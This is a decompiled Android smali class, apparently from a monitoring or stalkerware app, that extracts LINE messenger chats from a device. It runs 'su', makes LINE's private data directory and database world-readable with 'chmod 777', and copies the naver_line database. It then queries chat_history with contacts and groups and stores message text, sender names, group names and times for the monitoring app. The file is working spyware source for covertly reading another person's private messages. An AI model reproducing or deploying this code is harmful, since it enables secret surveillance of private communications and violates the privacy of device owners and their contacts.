.class public Lcom/hp/vd/module/monitor/line/UpTo91610110/LineChatExtractor;
.super Ljava/lang/Object;
.source "LineChatExtractor.java"

# interfaces
.implements Ljava/lang/Runnable;


# static fields
.field protected static final TAG:Ljava/lang/String; = "LineChatExtractor"

.field protected static final TEMP_FILE_NAME_PREFIX:Ljava/lang/String; = "lineChatTemp"


# instance fields
.field protected context:Lcom/hp/vd/context/Context;

.field protected lineChatDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/LineChatData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;


# direct methods
.method public constructor <init>(Lcom/hp/vd/context/Context;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Lcom/hp/vd/context/Context;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/LineChatData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/data/ModuleData;",
            "Lcom/hp/vd/agent/log/IWriter;",
            ")V"
        }
    .end annotation

    .line 34
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    .line 28
    iput-object v0, p0, Lcom/hp/vd/module/monitor/line/UpTo91610110/LineChatExtractor;->context:Lcom/hp/vd/context/Context;

    .line 29
    iput-object v0, p0, Lcom/hp/vd/module/monitor/line/UpTo91610110/LineChatExtractor;->lineChatDao:Lcom/j256/ormlite/dao/Dao;

    .line 30
    iput-object v0, p0, Lcom/hp/vd/module/monitor/line/UpTo91610110/LineChatExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 31
    iput-object v0, p0, Lcom/hp/vd/module/monitor/line/UpTo91610110/LineChatExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 35
    iput-object p1, p0, Lcom/hp/vd/module/monitor/line/UpTo91610110/LineChatExtractor;->context:Lcom/hp/vd/context/Context;

    .line 36
    iput-object p2, p0, Lcom/hp/vd/module/monitor/line/UpTo91610110/LineChatExtractor;->lineChatDao:Lcom/j256/ormlite/dao/Dao;

    .line 37
    iput-object p3, p0, Lcom/hp/vd/module/monitor/line/UpTo91610110/LineChatExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 38
    iput-object p4, p0, Lcom/hp/vd/module/monitor/line/UpTo91610110/LineChatExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    return-void
.end method


# virtual methods
.method protected chmod(Ljava/lang/String;Ljava/lang/Boolean;)Z
    .locals 4

    .line 259
    iget-object v0, p0, Lcom/hp/vd/module/monitor/line/UpTo91610110/LineChatExtractor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    .line 262
    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v1

    const-string v2, "su"

    invoke-virtual {v1, v2}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v1

    .line 263
    new-instance v2, Ljava/io/DataOutputStream;

    invoke-virtual {v1}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    .line 266
    invoke-virtual {p2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p2

    if-eqz p2, :cond_0

    .line 267
    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "chmod -R 777 "

    invoke-virtual {p2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "\n"

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p1}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    goto :goto_0

    .line 270
    :cond_0
    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "chmod 777 "

    invoke-virtual {p2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "\n"

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p1}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 273
    :goto_0
    invoke-virtual {v2}, Ljava/io/DataOutputStream;->flush()V

    const-string p1, "exit\n"

    .line 275
    invoke-virtual {v2, p1}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 276
    invoke-virtual {v2}, Ljava/io/DataOutputStream;->flush()V

    .line 278
    invoke-virtual {v1}, Ljava/lang/Process;->waitFor()I
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    const/4 p1, 0x1

    return p1

    :catch_0
    move-exception p1

    const-string p2, "LineChatExtractor"

    const-string v1, "chmod(): InterruptedException"

    .line 286
    invoke-interface {v0, p2, v1, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    goto :goto_1

    :catch_1
    move-exception p1

    const-string p2, "LineChatExtractor"

    const-string v1, "chmod(): IOException"

    .line 283
    invoke-interface {v0, p2, v1, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :goto_1
    const/4 p1, 0x0

    return p1
.end method

.method protected cleanTempFilesFromPreviousInvocations(Ljava/lang/String;)V
    .locals 3

    .line 342
    :try_start_0
    new-instance v0, Ljava/io/File;

    iget-object v1, p0, Lcom/hp/vd/module/monitor/line/UpTo91610110/LineChatExtractor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v1}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v1

    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 343
    new-instance v1, Lcom/hp/vd/module/monitor/line/UpTo91610110/StartsWithFilenameFilter;

    invoke-direct {v1, p1}, Lcom/hp/vd/module/monitor/line/UpTo91610110/StartsWithFilenameFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Ljava/io/File;->listFiles(Ljava/io/FilenameFilter;)[Ljava/io/File;

    move-result-object p1

    .line 345
    array-length v0, p1

    const/4 v1, 0x0

    :goto_0
    if-ge v1, v0, :cond_0

    aget-object v2, p1, v1

    .line 346
    invoke-virtual {v2}, Ljava/io/File;->delete()Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :catch_0
    move-exception p1

    .line 350
    iget-object v0, p0, Lcom/hp/vd/module/monitor/line/UpTo91610110/LineChatExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "LineChatExtractor"

    const-string v2, "Throwable caught while deleting temp files from previous invocation at"

    invoke-interface {v0, v1, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :cond_0
    return-void
.end method

.method public copy(Ljava/io/File;Ljava/io/File;)V
    .locals 7
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation

    .line 327
    new-instance v0, Ljava/io/FileInputStream;

    invoke-direct {v0, p1}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    .line 328
    new-instance p1, Ljava/io/FileOutputStream;

    invoke-direct {p1, p2}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .line 330
    invoke-virtual {v0}, Ljava/io/FileInputStream;->getChannel()Ljava/nio/channels/FileChannel;

    move-result-object v1

    .line 331
    invoke-virtual {p1}, Ljava/io/FileOutputStream;->getChannel()Ljava/nio/channels/FileChannel;

    move-result-object v6

    .line 333
    invoke-virtual {v1}, Ljava/nio/channels/FileChannel;->size()J

    move-result-wide v4

    const-wide/16 v2, 0x0

    invoke-virtual/range {v1 .. v6}, Ljava/nio/channels/FileChannel;->transferTo(JJLjava/nio/channels/WritableByteChannel;)J

    .line 335
    invoke-virtual {v0}, Ljava/io/FileInputStream;->close()V

    .line 336
    invoke-virtual {p1}, Ljava/io/FileOutputStream;->close()V

    return-void
.end method

.method protected detectDatabaseFiles()Ljava/lang/String;
    .locals 7

    const-string v0, "/data/data/jp.naver.line.android"

    .line 207
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "/databases"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 208
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, "/naver_line"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x3

    .line 211
    new-array v3, v3, [Ljava/lang/String;

    const/4 v4, 0x0

    aput-object v0, v3, v4

    const/4 v0, 0x1

    aput-object v1, v3, v0

    const/4 v0, 0x2

    aput-object v2, v3, v0

    .line 217
    array-length v0, v3

    move v1, v4

    :goto_0
    if-ge v1, v0, :cond_1

    aget-object v5, v3, v1

    .line 218
    invoke-virtual {p0, v5}, Lcom/hp/vd/module/monitor/line/UpTo91610110/LineChatExtractor;->isReadable(Ljava/lang/String;)Z

    move-result v6

    if-nez v6, :cond_0

    .line 219
    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-virtual {p0, v5, v6}, Lcom/hp/vd/module/monitor/line/UpTo91610110/LineChatExtractor;->chmod(Ljava/lang/String;Ljava/lang/Boolean;)Z

    :cond_0
    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    .line 223
    :cond_1
    new-instance v0, Ljava/io/File;

    invoke-direct {v0, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 225
    invoke-virtual {v0}, Ljava/io/File;->isFile()Z

    move-result v1

    if-eqz v1, :cond_3

    invoke-virtual {v0}, Ljava/io/File;->length()J

    move-result-wide v0

    const-wide/16 v3, 0x0

    cmp-long v5, v0, v3

    if-nez v5, :cond_2

    goto :goto_1

    :cond_2
    return-object v2

    :cond_3
    :goto_1
    const/4 v0, 0x0

    return-object v0
.end method

.method protected extractChats(Landroid/database/sqlite/SQLiteDatabase;)V
    .locals 8

    .line 118
    iget-object v0, p0, Lcom/hp/vd/module/monitor/line/UpTo91610110/LineChatExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v1, "ln_max_id"

    const/4 v2, 0x0

    invoke-virtual {p0, v0, v1, v2}, Lcom/hp/vd/module/monitor/line/UpTo91610110/LineChatExtractor;->safeExtractInt(Lcom/hp/vd/data/ModuleData;Ljava/lang/String;I)Ljava/lang/Integer;

    move-result-object v0

    .line 124
    iget-object v1, p0, Lcom/hp/vd/module/monitor/line/UpTo91610110/LineChatExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v3, "max_length"

    const/16 v4, 0x200

    invoke-virtual {p0, v1, v3, v4}, Lcom/hp/vd/module/monitor/line/UpTo91610110/LineChatExtractor;->safeExtractInt(Lcom/hp/vd/data/ModuleData;Ljava/lang/String;I)Ljava/lang/Integer;

    move-result-object v1

    .line 130
    new-instance v3, Lcom/hp/vd/module/monitor/line/UpTo91610110/Columns;

    invoke-direct {v3}, Lcom/hp/vd/module/monitor/line/UpTo91610110/Columns;-><init>()V

    :try_start_0
    const-string v4, "SELECT ch.id, ch.type, ch.status, c.name, g.name as group_name, ch.content, ch.created_time FROM chat_history ch LEFT JOIN contacts c ON c.m_id = ch.from_mid OR c.m_id = ch.chat_id LEFT JOIN groups g ON g.id = ch.chat_id WHERE ch.id > ? AND LENGTH(ch.content) < ? ORDER BY ch.id ASC LIMIT ?"

    const/4 v5, 0x3

    .line 136
    new-array v6, v5, [Ljava/lang/String;

    .line 139
    invoke-virtual {v0}, Ljava/lang/Integer;->toString()Ljava/lang/String;

    move-result-object v7

    aput-object v7, v6, v2

    const/4 v2, 0x1

    .line 140
    invoke-virtual {v1}, Ljava/lang/Integer;->toString()Ljava/lang/String;

    move-result-object v1

    aput-object v1, v6, v2

    const/4 v1, 0x2

    const-string v2, "300"

    aput-object v2, v6, v1

    .line 136
    invoke-virtual {p1, v4, v6}, Landroid/database/sqlite/SQLiteDatabase;->rawQuery(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object p1

    if-nez p1, :cond_0

    .line 146
    iget-object p1, p0, Lcom/hp/vd/module/monitor/line/UpTo91610110/LineChatExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v0, "LineChatExtractor"

    const-string v1, "Message Cursor is null."

    invoke-interface {p1, v0, v1, v5}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-void

    :cond_0
    if-eqz p1, :cond_1

    move-object v1, v0

    .line 152
    :goto_0
    invoke-interface {p1}, Landroid/database/Cursor;->moveToNext()Z

    move-result v2

    if-eqz v2, :cond_2

    .line 153
    new-instance v1, Lcom/hp/vd/data/LineChatData;

    invoke-direct {v1}, Lcom/hp/vd/data/LineChatData;-><init>()V

    .line 155
    invoke-virtual {v3}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v2, "id"

    invoke-interface {p1, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {p1, v2}, Landroid/database/Cursor;->getInt(I)I

    move-result v2

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    iput-object v2, v1, Lcom/hp/vd/data/LineChatData;->internalId:Ljava/lang/Integer;

    .line 157
    invoke-virtual {v3}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v2, "type"

    invoke-interface {p1, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {p1, v2}, Landroid/database/Cursor;->getInt(I)I

    move-result v2

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    iput-object v2, v1, Lcom/hp/vd/data/LineChatData;->type:Ljava/lang/Integer;

    .line 158
    invoke-virtual {v3}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v2, "status"

    invoke-interface {p1, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {p1, v2}, Landroid/database/Cursor;->getInt(I)I

    move-result v2

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    iput-object v2, v1, Lcom/hp/vd/data/LineChatData;->status:Ljava/lang/Integer;

    .line 160
    invoke-virtual {v3}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v2, "name"

    invoke-interface {p1, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {p1, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    iput-object v2, v1, Lcom/hp/vd/data/LineChatData;->name:Ljava/lang/String;

    .line 161
    invoke-virtual {v3}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v2, "group_name"

    invoke-interface {p1, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {p1, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    iput-object v2, v1, Lcom/hp/vd/data/LineChatData;->groupName:Ljava/lang/String;

    .line 163
    invoke-virtual {v3}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v2, "content"

    invoke-interface {p1, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {p1, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    iput-object v2, v1, Lcom/hp/vd/data/LineChatData;->content:Ljava/lang/String;

    .line 165
    invoke-virtual {v3}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v2, "created_time"

    invoke-interface {p1, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {p1, v2}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v4

    invoke-static {v4, v5}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v2

    .line 167
    new-instance v4, Ljava/util/Date;

    invoke-virtual {v2}, Ljava/lang/Long;->longValue()J

    move-result-wide v5

    invoke-direct {v4, v5, v6}, Ljava/util/Date;-><init>(J)V

    iput-object v4, v1, Lcom/hp/vd/data/LineChatData;->createdAt:Ljava/util/Date;

    .line 173
    iget-object v2, p0, Lcom/hp/vd/module/monitor/line/UpTo91610110/LineChatExtractor;->lineChatDao:Lcom/j256/ormlite/dao/Dao;

    invoke-interface {v2, v1}, Lcom/j256/ormlite/dao/Dao;->create(Ljava/lang/Object;)I

    .line 175
    iget-object v1, v1, Lcom/hp/vd/data/LineChatData;->internalId:Ljava/lang/Integer;

    goto/16 :goto_0

    :cond_1
    move-object v1, v0

    .line 179
    :cond_2
    invoke-interface {p1}, Landroid/database/Cursor;->close()V

    if-eq v0, v1, :cond_3

    .line 186
    iget-object p1, p0, Lcom/hp/vd/module/monitor/line/UpTo91610110/LineChatExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v0, "ln_max_id"

    invoke-virtual {p1, v0, v1}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 191
    iget-object p1, p0, Lcom/hp/vd/module/monitor/line/UpTo91610110/LineChatExtractor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {p1}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object p1

    invoke-virtual {p1}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getModuleDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object p1

    .line 192
    iget-object v0, p0, Lcom/hp/vd/module/monitor/line/UpTo91610110/LineChatExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-interface {p1, v0}, Lcom/j256/ormlite/dao/Dao;->update(Ljava/lang/Object;)I
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :cond_3
    return-void

    :catch_0
    move-exception p1

    .line 195
    iget-object v0, p0, Lcom/hp/vd/module/monitor/line/UpTo91610110/LineChatExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "LineChatExtractor"

    const-string v2, "Error extracting data."

    invoke-interface {v0, v1, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void
.end method

.method public isReadable(Ljava/lang/String;)Z
    .locals 1

    .line 252
    new-instance v0, Ljava/io/File;

    invoke-direct {v0, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 254
    invoke-virtual {v0}, Ljava/io/File;->canRead()Z

    move-result p1

    return p1
.end method

.method protected prepareDatabase(Ljava/io/File;Ljava/io/File;)Landroid/database/sqlite/SQLiteDatabase;
    .locals 4

    const/4 v0, 0x0

    .line 299
    :try_start_0
    invoke-virtual {p0, p1, p2}, Lcom/hp/vd/module/monitor/line/UpTo91610110/LineChatExtractor;->copy(Ljava/io/File;Ljava/io/File;)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1

    .line 313
    :try_start_1
    invoke-virtual {p2}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object p1

    const/16 v1, 0x10

    invoke-static {p1, v0, v1}, Landroid/database/sqlite/SQLiteDatabase;->openDatabase(Ljava/lang/String;Landroid/database/sqlite/SQLiteDatabase$CursorFactory;I)Landroid/database/sqlite/SQLiteDatabase;

    move-result-object p1
    :try_end_1
    .catch Landroid/database/sqlite/SQLiteException; {:try_start_1 .. :try_end_1} :catch_0

    return-object p1

    :catch_0
    move-exception p1

    .line 316
    iget-object v1, p0, Lcom/hp/vd/module/monitor/line/UpTo91610110/LineChatExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "LineChatExtractor"

    const-string v3, "Exception caught while opening database."

    invoke-interface {v1, v2, v3, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 317
    invoke-virtual {p2}, Ljava/io/File;->delete()Z

    return-object v0

    :catch_1
    move-exception p1

    .line 301
    iget-object p2, p0, Lcom/hp/vd/module/monitor/line/UpTo91610110/LineChatExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "LineChatExtractor"

    const-string v2, "prepareDatabase(): Exception caught during coping database to a temporary location."

    invoke-interface {p2, v1, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-object v0
.end method

.method public run()V
    .locals 5

    const-string v0, "lineChatTemp"

    .line 47
    invoke-virtual {p0, v0}, Lcom/hp/vd/module/monitor/line/UpTo91610110/LineChatExtractor;->cleanTempFilesFromPreviousInvocations(Ljava/lang/String;)V

    .line 52
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/line/UpTo91610110/LineChatExtractor;->detectDatabaseFiles()Ljava/lang/String;

    move-result-object v0

    if-nez v0, :cond_0

    .line 55
    iget-object v0, p0, Lcom/hp/vd/module/monitor/line/UpTo91610110/LineChatExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "LineChatExtractor"

    const-string v2, "No database detected."

    const/4 v3, 0x1

    invoke-interface {v0, v1, v2, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-void

    .line 60
    :cond_0
    new-instance v1, Ljava/io/File;

    invoke-direct {v1, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    :try_start_0
    const-string v0, "lineChatTemp"

    const-string v2, "db"

    .line 70
    iget-object v3, p0, Lcom/hp/vd/module/monitor/line/UpTo91610110/LineChatExtractor;->context:Lcom/hp/vd/context/Context;

    .line 73
    invoke-virtual {v3}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-virtual {v3}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v3

    invoke-virtual {v3}, Ljava/io/File;->getAbsoluteFile()Ljava/io/File;

    move-result-object v3

    .line 70
    invoke-static {v0, v2, v3}, Ljava/io/File;->createTempFile(Ljava/lang/String;Ljava/lang/String;Ljava/io/File;)Ljava/io/File;

    move-result-object v0

    .line 76
    invoke-virtual {p0, v1, v0}, Lcom/hp/vd/module/monitor/line/UpTo91610110/LineChatExtractor;->copy(Ljava/io/File;Ljava/io/File;)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1

    .line 90
    :try_start_1
    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x0

    const/16 v3, 0x10

    invoke-static {v1, v2, v3}, Landroid/database/sqlite/SQLiteDatabase;->openDatabase(Ljava/lang/String;Landroid/database/sqlite/SQLiteDatabase$CursorFactory;I)Landroid/database/sqlite/SQLiteDatabase;

    move-result-object v1
    :try_end_1
    .catch Landroid/database/sqlite/SQLiteException; {:try_start_1 .. :try_end_1} :catch_0

    .line 106
    invoke-virtual {p0, v1}, Lcom/hp/vd/module/monitor/line/UpTo91610110/LineChatExtractor;->extractChats(Landroid/database/sqlite/SQLiteDatabase;)V

    if-eqz v1, :cond_1

    .line 109
    invoke-virtual {v1}, Landroid/database/sqlite/SQLiteDatabase;->close()V

    :cond_1
    if-eqz v0, :cond_2

    .line 112
    invoke-virtual {v0}, Ljava/io/File;->delete()Z

    :cond_2
    return-void

    :catch_0
    move-exception v1

    .line 92
    iget-object v2, p0, Lcom/hp/vd/module/monitor/line/UpTo91610110/LineChatExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v3, "LineChatExtractor"

    const-string v4, "Exception caught while opening database."

    invoke-interface {v2, v3, v4, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 94
    invoke-virtual {v0}, Ljava/io/File;->delete()Z

    return-void

    :catch_1
    move-exception v0

    .line 78
    iget-object v1, p0, Lcom/hp/vd/module/monitor/line/UpTo91610110/LineChatExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "LineChatExtractor"

    const-string v3, "Exception copying the temp database"

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void
.end method

.method protected safeExtractInt(Lcom/hp/vd/data/ModuleData;Ljava/lang/String;I)Ljava/lang/Integer;
    .locals 0

    .line 235
    invoke-virtual {p1, p2}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    if-eqz p1, :cond_0

    .line 239
    :try_start_0
    invoke-static {p1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result p1
    :try_end_0
    .catch Ljava/lang/NumberFormatException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    :cond_0
    move p1, p3

    .line 247
    :goto_0
    invoke-static {p1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object p1

    return-object p1
.end method
